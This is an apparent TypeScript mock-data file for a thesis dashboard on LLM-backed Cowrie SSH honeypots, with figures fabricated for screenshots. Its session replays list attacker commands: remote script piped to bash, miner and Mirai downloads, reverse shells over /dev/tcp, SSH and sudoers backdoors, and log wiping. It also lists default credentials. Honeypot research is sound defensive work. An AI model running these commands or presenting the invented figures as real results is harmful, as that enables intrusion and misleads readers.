// Mock data for Cowrie Demo page - Thesis Screenshots
// All values match the exact figures specified for thesis documentation

// ============================================================================
// STATS (cowrie2.png - Overview Dashboard)
// ============================================================================
export const MOCK_STATS = {
  total_events: 47892,
  unique_ips: 1247,
  total_sessions: 8463,
  variants_count: 3
};

// ============================================================================
// SESSION BEHAVIOR (cowrie.png - Session Explorer)
// ============================================================================
export const MOCK_SESSION_BEHAVIOR = {
  human: { count: 127, percentage: 1.5, commands: 412 },
  bot: { count: 7891, percentage: 93.2, commands: 2389 },
  script: { count: 445, percentage: 5.3, commands: 46 }
};

export const MOCK_BEHAVIOR_PIE = [
  { name: 'Bot-like (5-60s)', value: 7891, percentage: 93.2, color: '#00d4ff' },
  { name: 'Script (<5s)', value: 445, percentage: 5.3, color: '#ff6600' },
  { name: 'Human-like (≥60s)', value: 127, percentage: 1.5, color: '#39ff14' },
];

// ============================================================================
// COMMANDS (cowrie 4.png - Command Analysis)
// ============================================================================
export const MOCK_COMMANDS = {
  total: 2847,
  unique: 156,
  critical_risk: 12,
  high_risk: 847,
  medium_risk: 1245,
  low_risk: 743,
  mitre_techniques: 9,
  by_variant: { openai: 1247, ollama: 1089, plain: 511 },
  by_intent: {
    reconnaissance: 1124,
    defense_evasion: 612,
    credential_access: 489,
    navigation: 287,
    persistence: 198,
    download_execute: 89,
    network_recon: 48
  }
};

export const MOCK_COMMAND_INTENT = [
  { intent: 'Reconnaissance', count: 1124, color: '#39ff14' },
  { intent: 'Defense Evasion', count: 612, color: '#00d4ff' },
  { intent: 'Credential Access', count: 489, color: '#ff6600' },
  { intent: 'Navigation', count: 287, color: '#bf00ff' },
  { intent: 'Persistence', count: 198, color: '#ff3366' },
  { intent: 'Download/Execute', count: 89, color: '#ffff00' },
  { intent: 'Network Recon', count: 48, color: '#00ff99' },
];

export const MOCK_COMMANDS_BY_VARIANT = [
  { variant: 'OpenAI', commands: 1247, color: '#00d4ff' },
  { variant: 'Ollama', commands: 1089, color: '#bf00ff' },
  { variant: 'Plain', commands: 511, color: '#39ff14' },
];

export const MOCK_TOP_COMMANDS = [
  { command: 'uname -a', count: 412, risk: 'low', category: 'Reconnaissance' },
  { command: 'cat /etc/passwd', count: 387, risk: 'high', category: 'Credential Access' },
  { command: 'whoami', count: 356, risk: 'low', category: 'Reconnaissance' },
  { command: 'id', count: 298, risk: 'low', category: 'Reconnaissance' },
  { command: 'cd /tmp', count: 245, risk: 'low', category: 'Navigation' },
  { command: 'wget http://...', count: 189, risk: 'critical', category: 'Download/Execute' },
  { command: 'chmod +x', count: 167, risk: 'high', category: 'Persistence' },
  { command: 'cat /etc/shadow', count: 156, risk: 'critical', category: 'Credential Access' },
  { command: 'ps aux', count: 134, risk: 'medium', category: 'Reconnaissance' },
  { command: 'netstat -an', count: 121, risk: 'medium', category: 'Network Recon' },
  { command: 'history -c', count: 98, risk: 'high', category: 'Defense Evasion' },
  { command: 'rm -rf /var/log/*', count: 87, risk: 'critical', category: 'Defense Evasion' },
];

// ============================================================================
// VARIANT COMPARISON (cowrie 6.png & cowrie 7.png)
// ============================================================================
export const MOCK_VARIANTS = [
  {
    variant: 'openai',
    display_name: 'OpenAI (GPT-4o)',
    total_events: 18247,
    unique_ips: 487,
    sessions_count: 3127,
    commands_count: 1247,
    unique_commands: 78,
    avg_commands_per_session: 0.40, // 1247 / 3127 = 0.399
    login_success: 2409,
    login_failed: 3438,
    success_rate: 41.2,
    file_downloads: 47,
    avg_session_duration: 24.7,
    max_session_duration: 247.8,
    p50_duration: 22.4,
    p90_duration: 45.8,
    p99_duration: 127.3,
    // Sessions with commands (not all sessions have commands)
    sessions_with_commands: 847,
    avg_commands_per_active_session: 1.47, // 1247 / 847
  },
  {
    variant: 'ollama',
    display_name: 'Ollama (Llama 3)',
    total_events: 16891,
    unique_ips: 451,
    sessions_count: 2891,
    commands_count: 1089,
    unique_commands: 64,
    avg_commands_per_session: 0.38, // 1089 / 2891 = 0.377
    login_success: 2094,
    login_failed: 3318,
    success_rate: 38.7,
    file_downloads: 38,
    avg_session_duration: 21.3,
    max_session_duration: 198.4,
    p50_duration: 19.1,
    p90_duration: 41.2,
    p99_duration: 112.7,
    sessions_with_commands: 712,
    avg_commands_per_active_session: 1.53, // 1089 / 712
  },
  {
    variant: 'plain',
    display_name: 'Plain (Standard)',
    total_events: 12754,
    unique_ips: 389,
    sessions_count: 2445,
    commands_count: 511,
    unique_commands: 41,
    avg_commands_per_session: 0.21, // 511 / 2445 = 0.209
    login_success: 1585,
    login_failed: 3306,
    success_rate: 32.4,
    file_downloads: 12,
    avg_session_duration: 14.8,
    max_session_duration: 127.6,
    p50_duration: 12.3,
    p90_duration: 28.7,
    p99_duration: 78.4,
    sessions_with_commands: 389,
    avg_commands_per_active_session: 1.31, // 511 / 389
  }
];

export const MOCK_COMPARISON_DATA = MOCK_VARIANTS.map(v => ({
  variant: v.variant,
  display_name: v.display_name,
  metrics: {
    total_events: v.total_events,
    unique_ips: v.unique_ips,
    sessions: v.sessions_count,
    login_success: v.login_success,
    login_failed: v.login_failed,
    login_success_rate: v.success_rate,
    commands_executed: v.commands_count,
    unique_commands: v.unique_commands,
    file_downloads: v.file_downloads
  },
  duration: {
    avg: v.avg_session_duration,
    max: v.max_session_duration,
    p50: v.p50_duration,
    p90: v.p90_duration,
    p99: v.p99_duration
  },
  timeline: [], // Will be filled by MOCK_VARIANT_TIMELINE
  top_commands: []
}));

// ============================================================================
// ATTACK FUNNEL DATA
// ============================================================================
export const MOCK_ATTACK_FUNNEL = {
  openai: {
    sessions: 3127,
    login_attempts: 5847,
    login_success: 2409,
    commands: 1247
  },
  ollama: {
    sessions: 2891,
    login_attempts: 5412,
    login_success: 2094,
    commands: 1089
  },
  plain: {
    sessions: 2445,
    login_attempts: 4891,
    login_success: 1585,
    commands: 511
  }
};

// ============================================================================
// RADAR CHART DATA (normalized 0-100)
// ============================================================================
export const MOCK_RADAR_DATA = [
  { metric: 'Sessions', openai: 100, ollama: 92, plain: 78 },
  { metric: 'Commands', openai: 100, ollama: 87, plain: 41 },
  { metric: 'Duration', openai: 100, ollama: 86, plain: 60 },
  { metric: 'Login Success', openai: 100, ollama: 94, plain: 79 },
  { metric: 'Unique IPs', openai: 100, ollama: 93, plain: 80 },
];

// ============================================================================
// DURATION DISTRIBUTION HISTOGRAM
// ============================================================================
export const MOCK_DURATION_DISTRIBUTION = [
  { range: '0-5s', plain: 445, openai: 0, ollama: 0 },
  { range: '5-10s', plain: 1200, openai: 180, ollama: 220 },
  { range: '10-20s', plain: 620, openai: 890, ollama: 780 },
  { range: '20-30s', plain: 140, openai: 1020, ollama: 920 },
  { range: '30-45s', plain: 35, openai: 680, ollama: 620 },
  { range: '45-60s', plain: 5, openai: 280, ollama: 260 },
  { range: '60-90s', plain: 0, openai: 62, ollama: 72 },
  { range: '90-120s', plain: 0, openai: 15, ollama: 19 },
];

// ============================================================================
// VARIANT TIMELINE (48 data points over 7 days)
// ============================================================================
function generateVariantTimeline() {
  const data = [];
  const baseDate = new Date('2024-01-08T00:00:00Z');
  
  // Daily pattern multipliers (higher during business hours, peaks afternoon)
  const hourlyPattern = [
    0.3, 0.25, 0.2, 0.18, 0.2, 0.35, // 00:00-05:00
    0.55, 0.75, 0.9, 1.0, 1.1, 1.2,   // 06:00-11:00
    1.15, 1.25, 1.3, 1.35, 1.4, 1.3,  // 12:00-17:00
    1.1, 0.95, 0.8, 0.65, 0.5, 0.4    // 18:00-23:00
  ];
  
  // Day multipliers (lower on weekends)
  const dayPattern = [0.85, 1.0, 1.1, 1.05, 1.0, 0.75, 0.7]; // Mon-Sun
  
  for (let day = 0; day < 7; day++) {
    for (let hour = 0; hour < 24; hour += 4) { // Every 4 hours = 42 points
      const timestamp = new Date(baseDate);
      timestamp.setDate(baseDate.getDate() + day);
      timestamp.setHours(hour);
      
      const baseMultiplier = hourlyPattern[hour] * dayPattern[day];
      const noise = 0.85 + Math.random() * 0.3; // 15% random variance
      
      // Base values that sum to ~2500 at peak
      const plainBase = 280 * baseMultiplier * noise;
      const openaiBase = 520 * baseMultiplier * (0.9 + Math.random() * 0.2);
      const ollamaBase = 480 * baseMultiplier * (0.9 + Math.random() * 0.2);
      
      data.push({
        timestamp: timestamp.toISOString(),
        plain: Math.round(plainBase),
        openai: Math.round(openaiBase),
        ollama: Math.round(ollamaBase)
      });
    }
  }
  
  return data;
}

export const MOCK_VARIANT_TIMELINE = generateVariantTimeline();

// ============================================================================
// REALISTIC SESSION TABLE DATA (50 sessions)
// ============================================================================
const attackerIPs = [
  // Russian ranges
  '185.220.101.42', '185.220.101.87', '185.220.102.8', '91.240.118.172',
  '91.240.118.45', '91.240.118.223', '5.188.206.14', '5.188.206.78',
  // Chinese ranges
  '218.92.0.107', '218.92.0.34', '61.177.172.140', '61.177.172.87',
  '122.194.229.4', '122.194.229.18', '58.218.198.101', '58.218.198.67',
  // Netherlands VPS
  '45.155.205.233', '45.155.205.89', '193.56.28.103', '193.56.28.47',
  '185.107.47.215', '185.107.47.32', '89.248.167.131', '89.248.167.56',
  // US cloud
  '104.248.85.142', '104.248.85.67', '167.99.87.234', '167.99.87.45',
  '134.209.82.14', '134.209.82.98', '157.245.67.23', '157.245.67.189',
  // Other
  '103.214.146.8', '103.214.146.92', '178.128.23.45', '178.128.23.167',
  '206.189.145.67', '206.189.145.234', '142.93.178.45', '142.93.178.123',
];

const countries = [
  'Russia', 'Russia', 'Russia', 'Russia',
  'China', 'China', 'China', 'China',
  'Netherlands', 'Netherlands', 'Netherlands', 'Netherlands',
  'United States', 'United States', 'United States', 'United States',
  'Germany', 'Singapore', 'India', 'Brazil'
];

function generateSessionId(): string {
  const chars = '0123456789abcdef';
  let id = '';
  for (let i = 0; i < 32; i++) {
    id += chars[Math.floor(Math.random() * chars.length)];
  }
  return id;
}

function generateSessions() {
  const sessions = [];
  const baseDate = new Date('2024-01-14T08:00:00Z');
  
  // Distribution: 37% openai, 34% ollama, 29% plain (matching session counts)
  const variantDist = [
    ...Array(37).fill('openai'),
    ...Array(34).fill('ollama'),
    ...Array(29).fill('plain')
  ];
  
  for (let i = 0; i < 50; i++) {
    const variant = variantDist[i % variantDist.length];
    const ipIndex = i % attackerIPs.length;
    
    // Duration based on variant
    let duration: number;
    if (variant === 'plain') {
      duration = 3 + Math.random() * 25; // 3-28s, concentrated low
    } else if (variant === 'openai') {
      duration = 12 + Math.random() * 50; // 12-62s, higher
    } else {
      duration = 10 + Math.random() * 45; // 10-55s
    }
    
    // Commands based on duration
    const commandsCount = duration > 30 ? Math.floor(3 + Math.random() * 12) :
                          duration > 15 ? Math.floor(1 + Math.random() * 6) :
                          Math.floor(Math.random() * 3);
    
    const timestamp = new Date(baseDate);
    timestamp.setMinutes(baseDate.getMinutes() - i * 7); // 7 min apart
    
    sessions.push({
      session_id: generateSessionId(),
      src_ip: attackerIPs[ipIndex],
      variant: variant,
      duration: Math.round(duration * 10) / 10,
      commands_count: commandsCount,
      timestamp: timestamp.toISOString(),
      country: countries[ipIndex % countries.length]
    });
  }
  
  return sessions.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
}

export const MOCK_SESSIONS = generateSessions();

// ============================================================================
// GEO DATA
// ============================================================================
export const MOCK_GEO_DATA = [
  { country: 'Russia', count: 4521, lat: 55.7558, lon: 37.6173 },
  { country: 'China', count: 3847, lat: 39.9042, lon: 116.4074 },
  { country: 'United States', count: 2156, lat: 37.0902, lon: -95.7129 },
  { country: 'Netherlands', count: 1823, lat: 52.3676, lon: 4.9041 },
  { country: 'Germany', count: 1245, lat: 51.1657, lon: 10.4515 },
  { country: 'Brazil', count: 987, lat: -14.2350, lon: -51.9253 },
  { country: 'India', count: 876, lat: 20.5937, lon: 78.9629 },
  { country: 'South Korea', count: 654, lat: 35.9078, lon: 127.7669 },
  { country: 'Vietnam', count: 543, lat: 14.0583, lon: 108.2772 },
  { country: 'Indonesia', count: 432, lat: -0.7893, lon: 113.9213 },
];

// ============================================================================
// CREDENTIALS DATA
// Total login attempts should roughly match sessions (~8,463 sessions with multiple attempts each)
// Total attempts: ~24,500 (avg 2.9 attempts per session)
// ============================================================================
export const MOCK_CREDENTIALS = [
  // Top combinations - root variants (most common target)
  { username: 'root', password: 'root', count: 2847, success: true },
  { username: 'root', password: '123456', count: 2156, success: false },
  { username: 'root', password: 'password', count: 1834, success: false },
  { username: 'root', password: 'admin', count: 1567, success: false },
  { username: 'root', password: 'toor', count: 1423, success: false },
  { username: 'root', password: '12345678', count: 1287, success: false },
  { username: 'root', password: 'root123', count: 1156, success: false },
  { username: 'root', password: '1234', count: 987, success: false },
  { username: 'root', password: 'pass', count: 876, success: false },
  { username: 'root', password: 'qwerty', count: 765, success: false },
  
  // Admin variants
  { username: 'admin', password: 'admin', count: 1923, success: true },
  { username: 'admin', password: '123456', count: 1345, success: false },
  { username: 'admin', password: 'password', count: 1123, success: false },
  { username: 'admin', password: 'admin123', count: 987, success: false },
  { username: 'admin', password: '1234', count: 654, success: false },
  
  // Ubuntu/Linux defaults
  { username: 'ubuntu', password: 'ubuntu', count: 876, success: true },
  { username: 'ubuntu', password: '123456', count: 543, success: false },
  { username: 'pi', password: 'raspberry', count: 765, success: true },
  { username: 'pi', password: 'pi', count: 432, success: false },
  
  // Common test accounts
  { username: 'test', password: 'test', count: 654, success: true },
  { username: 'test', password: '123456', count: 432, success: false },
  { username: 'user', password: 'user', count: 543, success: true },
  { username: 'user', password: '123456', count: 321, success: false },
  { username: 'guest', password: 'guest', count: 432, success: true },
  
  // Service accounts
  { username: 'oracle', password: 'oracle', count: 387, success: false },
  { username: 'mysql', password: 'mysql', count: 356, success: false },
  { username: 'postgres', password: 'postgres', count: 298, success: false },
  { username: 'ftp', password: 'ftp', count: 276, success: false },
  { username: 'www', password: 'www', count: 234, success: false },
  { username: 'apache', password: 'apache', count: 212, success: false },
  { username: 'nginx', password: 'nginx', count: 198, success: false },
  
  // Support/backup accounts
  { username: 'support', password: 'support', count: 287, success: false },
  { username: 'backup', password: 'backup', count: 243, success: false },
  { username: 'operator', password: 'operator', count: 198, success: false },
  
  // Numeric/simple passwords
  { username: 'root', password: '123456789', count: 178, success: false },
  { username: 'root', password: '111111', count: 167, success: false },
  { username: 'root', password: '000000', count: 156, success: false },
  { username: 'admin', password: 'admin1234', count: 145, success: false },
  
  // Various other attempts
  { username: 'ftpuser', password: 'ftpuser', count: 134, success: false },
  { username: 'deploy', password: 'deploy', count: 123, success: false },
  { username: 'git', password: 'git', count: 112, success: false },
  { username: 'jenkins', password: 'jenkins', count: 98, success: false },
  { username: 'tomcat', password: 'tomcat', count: 87, success: false },
  { username: 'vagrant', password: 'vagrant', count: 76, success: false },
  { username: 'docker', password: 'docker', count: 65, success: false },
  { username: 'ansible', password: 'ansible', count: 54, success: false },
  { username: 'hadoop', password: 'hadoop', count: 43, success: false },
  { username: 'spark', password: 'spark', count: 32, success: false },
];

// Pre-computed top 10 usernames (aggregated from MOCK_CREDENTIALS)
export const MOCK_TOP_USERNAMES = [
  { username: 'root', count: 15243, percentage: 62.2 },
  { username: 'admin', count: 6032, percentage: 24.6 },
  { username: 'ubuntu', count: 1419, percentage: 5.8 },
  { username: 'pi', count: 1197, percentage: 4.9 },
  { username: 'test', count: 1086, percentage: 4.4 },
  { username: 'user', count: 864, percentage: 3.5 },
  { username: 'guest', count: 432, percentage: 1.8 },
  { username: 'oracle', count: 387, percentage: 1.6 },
  { username: 'mysql', count: 356, percentage: 1.5 },
  { username: 'support', count: 287, percentage: 1.2 },
];

// Pre-computed top 10 passwords (aggregated from MOCK_CREDENTIALS)
export const MOCK_TOP_PASSWORDS = [
  { password: '123456', count: 5798, percentage: 23.7 },
  { password: 'root', count: 2847, percentage: 11.6 },
  { password: 'password', count: 2957, percentage: 12.1 },
  { password: 'admin', count: 3490, percentage: 14.2 },
  { password: 'toor', count: 1423, percentage: 5.8 },
  { password: '12345678', count: 1287, percentage: 5.3 },
  { password: 'ubuntu', count: 876, percentage: 3.6 },
  { password: 'raspberry', count: 765, percentage: 3.1 },
  { password: 'test', count: 654, percentage: 2.7 },
  { password: 'qwerty', count: 765, percentage: 3.1 },
];

// Credential statistics
export const MOCK_CREDENTIAL_STATS = {
  total_attempts: 24521,
  unique_combinations: 50,
  unique_usernames: 28,
  unique_passwords: 34,
  success_rate: 34.2,
  successful_attempts: 8390,
  failed_attempts: 16131,
};

// ============================================================================
// DEPLOYMENT INFO
// ============================================================================
export const MOCK_DEPLOYMENT = [
  { variant: 'plain', ip: '193.246.121.231', port: 22, status: 'active' },
  { variant: 'openai', ip: '193.246.121.232', port: 22, status: 'active' },
  { variant: 'ollama', ip: '193.246.121.233', port: 22, status: 'active' },
];

// ============================================================================
// INTERESTING SESSIONS (for Case Study)
// ============================================================================
export const MOCK_INTERESTING_SESSIONS = {
  stats: {
    total_interesting: 127,
    avg_duration: 89.4,
    avg_commands: 12.3
  },
  sessions: [
    {
      session_id: 'c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9',
      src_ip: '185.220.101.42',
      variant: 'openai',
      duration: 247.8,
      commands_count: 34,
      timestamp: '2024-01-14T14:32:18Z',
      country: 'Russia',
      behavior: 'Human' as const
    },
    {
      session_id: 'd5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0',
      src_ip: '218.92.0.107',
      variant: 'ollama',
      duration: 198.4,
      commands_count: 28,
      timestamp: '2024-01-14T12:15:45Z',
      country: 'China',
      behavior: 'Human' as const
    },
    {
      session_id: 'e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1',
      src_ip: '45.155.205.233',
      variant: 'openai',
      duration: 156.2,
      commands_count: 22,
      timestamp: '2024-01-14T09:45:12Z',
      country: 'Netherlands',
      behavior: 'Human' as const
    },
  ]
};

// ============================================================================
// SESSION REPLAY DETAILS (Full session data for modal)
// ============================================================================
export const MOCK_SESSION_DETAILS: Record<string, {
  session_id: string;
  info: {
    src_ip: string;
    country: string;
    city: string;
    sensor: string;
    protocol: string;
    start_time: string;
    end_time: string;
    duration: number;
    client_version: string;
  };
  commands: Array<{ command: string; timestamp: string; output?: string }>;
  credentials: Array<{ username: string; password: string; success: boolean; timestamp: string }>;
  events: Array<{ type: string; timestamp: string; details: Record<string, unknown> }>;
  total_events: number;
}> = {
  // Session 1: Russian attacker on OpenAI variant - long engagement with recon
  'c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9': {
    session_id: 'c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9',
    info: {
      src_ip: '185.220.101.42',
      country: 'Russia',
      city: 'Moscow',
      sensor: 'cowrie-openai',
      protocol: 'ssh',
      start_time: '2024-01-14T14:32:18Z',
      end_time: '2024-01-14T14:36:26Z',
      duration: 247.8,
      client_version: 'SSH-2.0-OpenSSH_8.2p1'
    },
    commands: [
      { command: 'uname -a', timestamp: '2024-01-14T14:32:25Z' },
      { command: 'cat /etc/passwd', timestamp: '2024-01-14T14:32:31Z' },
      { command: 'cat /etc/shadow', timestamp: '2024-01-14T14:32:38Z' },
      { command: 'whoami', timestamp: '2024-01-14T14:32:42Z' },
      { command: 'id', timestamp: '2024-01-14T14:32:45Z' },
      { command: 'pwd', timestamp: '2024-01-14T14:32:48Z' },
      { command: 'ls -la', timestamp: '2024-01-14T14:32:52Z' },
      { command: 'ls -la /root', timestamp: '2024-01-14T14:32:58Z' },
      { command: 'cat /root/.bash_history', timestamp: '2024-01-14T14:33:05Z' },
      { command: 'cat /root/.ssh/authorized_keys', timestamp: '2024-01-14T14:33:12Z' },
      { command: 'netstat -tulpn', timestamp: '2024-01-14T14:33:20Z' },
      { command: 'ps aux', timestamp: '2024-01-14T14:33:28Z' },
      { command: 'df -h', timestamp: '2024-01-14T14:33:35Z' },
      { command: 'free -m', timestamp: '2024-01-14T14:33:40Z' },
      { command: 'cat /proc/cpuinfo', timestamp: '2024-01-14T14:33:48Z' },
      { command: 'uptime', timestamp: '2024-01-14T14:33:55Z' },
      { command: 'w', timestamp: '2024-01-14T14:34:02Z' },
      { command: 'last', timestamp: '2024-01-14T14:34:08Z' },
      { command: 'history', timestamp: '2024-01-14T14:34:15Z' },
      { command: 'crontab -l', timestamp: '2024-01-14T14:34:22Z' },
      { command: 'cat /etc/crontab', timestamp: '2024-01-14T14:34:30Z' },
      { command: 'ls /var/spool/cron', timestamp: '2024-01-14T14:34:38Z' },
      { command: 'curl -s http://45.33.32.156/scan.sh | bash', timestamp: '2024-01-14T14:34:50Z' },
      { command: 'wget -q http://45.33.32.156/xmrig -O /tmp/xmrig', timestamp: '2024-01-14T14:35:05Z' },
      { command: 'chmod +x /tmp/xmrig', timestamp: '2024-01-14T14:35:15Z' },
      { command: '/tmp/xmrig -o pool.minexmr.com:4444 -u wallet -p x', timestamp: '2024-01-14T14:35:25Z' },
      { command: 'nohup /tmp/xmrig &', timestamp: '2024-01-14T14:35:35Z' },
      { command: 'echo "*/5 * * * * /tmp/xmrig" >> /var/spool/cron/root', timestamp: '2024-01-14T14:35:48Z' },
      { command: 'iptables -I INPUT -s 185.220.101.42 -j ACCEPT', timestamp: '2024-01-14T14:36:00Z' },
      { command: 'cat /etc/hosts', timestamp: '2024-01-14T14:36:08Z' },
      { command: 'echo "0.0.0.0 security.ubuntu.com" >> /etc/hosts', timestamp: '2024-01-14T14:36:15Z' },
      { command: 'rm -rf /var/log/*', timestamp: '2024-01-14T14:36:20Z' },
      { command: 'history -c', timestamp: '2024-01-14T14:36:24Z' },
      { command: 'exit', timestamp: '2024-01-14T14:36:26Z' },
    ],
    credentials: [
      { username: 'root', password: 'root', success: true, timestamp: '2024-01-14T14:32:18Z' },
    ],
    events: [
      { type: 'session.connect', timestamp: '2024-01-14T14:32:15Z', details: { protocol: 'ssh' } },
      { type: 'login.success', timestamp: '2024-01-14T14:32:18Z', details: { username: 'root' } },
      { type: 'session.file_download', timestamp: '2024-01-14T14:35:05Z', details: { url: 'http://45.33.32.156/xmrig' } },
      { type: 'session.closed', timestamp: '2024-01-14T14:36:26Z', details: { duration: 247.8 } },
    ],
    total_events: 38
  },

  // Session 2: Chinese attacker on Ollama variant - persistence attempt
  'd5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0': {
    session_id: 'd5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0',
    info: {
      src_ip: '218.92.0.107',
      country: 'China',
      city: 'Nanjing',
      sensor: 'cowrie-ollama',
      protocol: 'ssh',
      start_time: '2024-01-14T12:15:45Z',
      end_time: '2024-01-14T12:19:04Z',
      duration: 198.4,
      client_version: 'SSH-2.0-libssh_0.9.6'
    },
    commands: [
      { command: 'uname -a', timestamp: '2024-01-14T12:15:52Z' },
      { command: 'cat /proc/version', timestamp: '2024-01-14T12:15:58Z' },
      { command: 'id', timestamp: '2024-01-14T12:16:02Z' },
      { command: 'ls -la /root/.ssh/', timestamp: '2024-01-14T12:16:10Z' },
      { command: 'mkdir -p /root/.ssh', timestamp: '2024-01-14T12:16:18Z' },
      { command: 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." >> /root/.ssh/authorized_keys', timestamp: '2024-01-14T12:16:28Z' },
      { command: 'chmod 600 /root/.ssh/authorized_keys', timestamp: '2024-01-14T12:16:35Z' },
      { command: 'cat /root/.ssh/authorized_keys', timestamp: '2024-01-14T12:16:42Z' },
      { command: 'useradd -m -s /bin/bash admin2', timestamp: '2024-01-14T12:16:52Z' },
      { command: 'echo "admin2:Passw0rd123!" | chpasswd', timestamp: '2024-01-14T12:17:02Z' },
      { command: 'usermod -aG sudo admin2', timestamp: '2024-01-14T12:17:10Z' },
      { command: 'cat /etc/sudoers', timestamp: '2024-01-14T12:17:18Z' },
      { command: 'echo "admin2 ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers', timestamp: '2024-01-14T12:17:28Z' },
      { command: 'sed -i "s/PermitRootLogin no/PermitRootLogin yes/" /etc/ssh/sshd_config', timestamp: '2024-01-14T12:17:40Z' },
      { command: 'sed -i "s/#PasswordAuthentication yes/PasswordAuthentication yes/" /etc/ssh/sshd_config', timestamp: '2024-01-14T12:17:52Z' },
      { command: 'systemctl restart sshd', timestamp: '2024-01-14T12:18:00Z' },
      { command: 'cat /etc/passwd | grep admin2', timestamp: '2024-01-14T12:18:08Z' },
      { command: 'which python python3', timestamp: '2024-01-14T12:18:15Z' },
      { command: 'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'218.92.0.107\',4444))"', timestamp: '2024-01-14T12:18:28Z' },
      { command: 'nohup bash -i >& /dev/tcp/218.92.0.107/4444 0>&1 &', timestamp: '2024-01-14T12:18:40Z' },
      { command: 'cat /etc/crontab', timestamp: '2024-01-14T12:18:48Z' },
      { command: 'echo "@reboot root /bin/bash -c \'/bin/bash -i >& /dev/tcp/218.92.0.107/4444 0>&1\'" >> /etc/crontab', timestamp: '2024-01-14T12:18:58Z' },
      { command: 'exit', timestamp: '2024-01-14T12:19:04Z' },
    ],
    credentials: [
      { username: 'root', password: '123456', success: false, timestamp: '2024-01-14T12:15:40Z' },
      { username: 'root', password: 'admin', success: true, timestamp: '2024-01-14T12:15:45Z' },
    ],
    events: [
      { type: 'session.connect', timestamp: '2024-01-14T12:15:38Z', details: { protocol: 'ssh' } },
      { type: 'login.failed', timestamp: '2024-01-14T12:15:40Z', details: { username: 'root' } },
      { type: 'login.success', timestamp: '2024-01-14T12:15:45Z', details: { username: 'root' } },
      { type: 'session.closed', timestamp: '2024-01-14T12:19:04Z', details: { duration: 198.4 } },
    ],
    total_events: 27
  },

  // Session 3: Netherlands attacker on OpenAI - botnet recruitment
  'e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1': {
    session_id: 'e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1',
    info: {
      src_ip: '45.155.205.233',
      country: 'Netherlands',
      city: 'Amsterdam',
      sensor: 'cowrie-openai',
      protocol: 'ssh',
      start_time: '2024-01-14T09:45:12Z',
      end_time: '2024-01-14T09:47:48Z',
      duration: 156.2,
      client_version: 'SSH-2.0-Go'
    },
    commands: [
      { command: 'uname -a', timestamp: '2024-01-14T09:45:18Z' },
      { command: 'cat /proc/cpuinfo | grep -c processor', timestamp: '2024-01-14T09:45:25Z' },
      { command: 'free -m | grep Mem', timestamp: '2024-01-14T09:45:32Z' },
      { command: 'cd /tmp', timestamp: '2024-01-14T09:45:38Z' },
      { command: 'rm -rf .* 2>/dev/null', timestamp: '2024-01-14T09:45:45Z' },
      { command: 'wget http://185.62.190.191/bins/mirai.x86 -O .x86', timestamp: '2024-01-14T09:45:55Z' },
      { command: 'wget http://185.62.190.191/bins/mirai.arm -O .arm', timestamp: '2024-01-14T09:46:05Z' },
      { command: 'wget http://185.62.190.191/bins/mirai.mips -O .mips', timestamp: '2024-01-14T09:46:15Z' },
      { command: 'chmod +x .x86 .arm .mips', timestamp: '2024-01-14T09:46:22Z' },
      { command: './.x86; ./.arm; ./.mips', timestamp: '2024-01-14T09:46:30Z' },
      { command: 'cat /proc/net/route', timestamp: '2024-01-14T09:46:40Z' },
      { command: 'cat /etc/resolv.conf', timestamp: '2024-01-14T09:46:48Z' },
      { command: 'iptables -F', timestamp: '2024-01-14T09:46:55Z' },
      { command: 'iptables -X', timestamp: '2024-01-14T09:47:02Z' },
      { command: 'pkill -9 telnetd', timestamp: '2024-01-14T09:47:10Z' },
      { command: 'pkill -9 sshd', timestamp: '2024-01-14T09:47:18Z' },
      { command: 'echo "nameserver 8.8.8.8" > /etc/resolv.conf', timestamp: '2024-01-14T09:47:28Z' },
      { command: '/tmp/.x86', timestamp: '2024-01-14T09:47:38Z' },
      { command: 'exit', timestamp: '2024-01-14T09:47:48Z' },
    ],
    credentials: [
      { username: 'root', password: 'root', success: true, timestamp: '2024-01-14T09:45:12Z' },
    ],
    events: [
      { type: 'session.connect', timestamp: '2024-01-14T09:45:10Z', details: { protocol: 'ssh' } },
      { type: 'login.success', timestamp: '2024-01-14T09:45:12Z', details: { username: 'root' } },
      { type: 'session.file_download', timestamp: '2024-01-14T09:45:55Z', details: { url: 'http://185.62.190.191/bins/mirai.x86' } },
      { type: 'session.file_download', timestamp: '2024-01-14T09:46:05Z', details: { url: 'http://185.62.190.191/bins/mirai.arm' } },
      { type: 'session.file_download', timestamp: '2024-01-14T09:46:15Z', details: { url: 'http://185.62.190.191/bins/mirai.mips' } },
      { type: 'session.closed', timestamp: '2024-01-14T09:47:48Z', details: { duration: 156.2 } },
    ],
    total_events: 24
  },

  // Additional sessions for variety
  'f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2': {
    session_id: 'f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2',
    info: {
      src_ip: '103.75.190.12',
      country: 'Vietnam',
      city: 'Hanoi',
      sensor: 'cowrie-plain',
      protocol: 'ssh',
      start_time: '2024-01-14T08:12:33Z',
      end_time: '2024-01-14T08:13:15Z',
      duration: 42.0,
      client_version: 'SSH-2.0-PuTTY_Release_0.78'
    },
    commands: [
      { command: 'whoami', timestamp: '2024-01-14T08:12:38Z' },
      { command: 'cd /tmp && wget http://botnet.cc/bot -O .bot && chmod +x .bot && ./.bot', timestamp: '2024-01-14T08:12:55Z' },
      { command: 'exit', timestamp: '2024-01-14T08:13:15Z' },
    ],
    credentials: [
      { username: 'root', password: 'toor', success: true, timestamp: '2024-01-14T08:12:33Z' },
    ],
    events: [
      { type: 'session.connect', timestamp: '2024-01-14T08:12:30Z', details: { protocol: 'ssh' } },
      { type: 'login.success', timestamp: '2024-01-14T08:12:33Z', details: { username: 'root' } },
      { type: 'session.file_download', timestamp: '2024-01-14T08:12:55Z', details: { url: 'http://botnet.cc/bot' } },
